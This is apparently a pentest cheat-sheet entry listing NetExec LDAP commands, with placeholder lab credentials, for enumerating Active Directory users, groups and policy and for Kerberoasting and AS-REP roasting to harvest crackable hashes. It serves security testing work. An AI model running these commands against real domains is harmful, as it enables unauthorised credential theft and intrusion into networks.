---
description: |
  NetExec LDAP module — enumerate AD users, groups, password policy,
  Kerberoast, AS-REP roast, and more.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Enumerate users
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --users

  # Enumerate groups
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --groups

  # Password policy
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --pass-pol

  # Kerberoast
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --kerberoasting kerb.txt

  # AS-REP Roast
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --asreproast asrep.txt

  # Find admin count users
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --admin-count

  # Enumerate trusts
  nxc ldap 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --trusted-for-delegation
phase:
  - Enumeration
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
techniques:
  - Kerberoasting
  - AS-REP_Roasting
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
